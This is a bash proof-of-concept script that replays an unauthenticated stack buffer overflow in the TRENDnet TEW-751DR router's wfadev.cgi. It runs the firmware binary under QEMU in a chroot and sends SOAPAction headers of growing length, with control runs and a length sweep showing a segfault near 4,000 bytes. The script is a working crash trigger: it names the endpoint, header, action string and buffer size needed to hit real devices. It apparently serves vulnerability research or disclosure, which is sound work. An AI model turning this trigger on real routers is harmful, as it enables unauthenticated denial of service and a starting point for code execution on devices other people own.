#!/bin/bash
# Unauthenticated stack buffer overflow in TRENDnet TEW-751DR wfadev.cgi.
# Only one variable changes between runs: the length N of the SOAPAction prefix.
#
#   ROOTFS=/path/to/extracted/rootfs ./replay_wfadev_overflow.sh
#
# Requires: sudo (chroot), qemu-mips-static placed inside the rootfs as /qemu-mips-static.
set -u
exec 2>/dev/null            # silence bash's "killed by signal" note; the exit code is printed

R=${ROOTFS:-/tmp/tew751-rootfs}
[ -x "$R/htdocs/cgibin" ] || { echo "rootfs not found: $R (set ROOTFS=...)" >&2; exit 1; }
CGI=/var/htdocs/upnp/wfadev.cgi

hit() {   # $1 = SOAPAction prefix length
  local n=$1 sa
  sa=$(python3 -c "print('A'*$n + '#SetAPSettings')")
  printf '<a/>' | sudo -n env -i \
      REQUEST_METHOD=POST REQUEST_URI='/wfadev.cgi?service=WFAWLANConfig1' \
      HTTP_SOAPACTION="$sa" CONTENT_LENGTH=4 CONTENT_TYPE=text/xml \
      GATEWAY_INTERFACE=CGI/1.1 SERVER_PROTOCOL=HTTP/1.1 REMOTE_ADDR=127.0.0.1 \
      /usr/sbin/chroot "$R" /bin/sh -c "cd /; $CGI; echo EXIT=\$?" 2>&1
}

echo "=== wfadev.cgi SOAPAction -> 4100-byte stack buffer (no authentication) ==="
echo "target : TRENDnet TEW-751DR 1.03B01   (733GR ships the same cgibin)"
echo "image  : TEW-751DRv1_(FW1.03B01).zip"
echo "sha256 : fe1168fc2b2bf4744df3a7145eeaf11b2c5272ae502c8f2993e5c614499322ec"
echo "cgibin : $(sudo -n sha256sum "$R/htdocs/cgibin" | cut -c1-64)"
echo "host   : $(hostname)  $(date -Iseconds)"
echo "request: POST /wfadev.cgi?service=WFAWLANConfig1  (SOAPAction: 'A'*N + '#SetAPSettings')"
echo "single variable: N (SOAPAction prefix length)"
echo

echo "########## CONTROL   N=26 (a normal action string) ##########"
hit 26 | grep -E "HTTP/1.1|xmlns:u=|EXIT=" | sed 's/^/    /'
echo

echo "########## CONTROL   N=3900 (still inside the buffer) ##########"
out=$(hit 3900); echo "    $(echo "$out" | tail -1)   <- CGI returns normally"
echo

echo "########## TRIGGER   N=4000 (overflows the 4100-byte buffer) ##########"
out=$(hit 4000)
echo "    $(echo "$out" | grep -m1 -E 'uncaught target signal|EXIT=' | sed 's/^qemu: //')"
echo "    $(echo "$out" | tail -1)"
echo

echo "########## BOUNDARY   length sweep ##########"
echo "    N      result"
for n in 3860 3900 3940 3960 3980 4000 4200; do
  out=$(hit $n)
  rc=$(echo "$out" | grep -o 'EXIT=[0-9]*' | tail -1 | cut -d= -f2)
  printf '    %-6s %s%s\n' "$n" "EXIT=$rc" "$([ "$rc" = "139" ] && echo '  <- SIGSEGV')"
done
echo
echo "[replay done] only N changed between the requests"
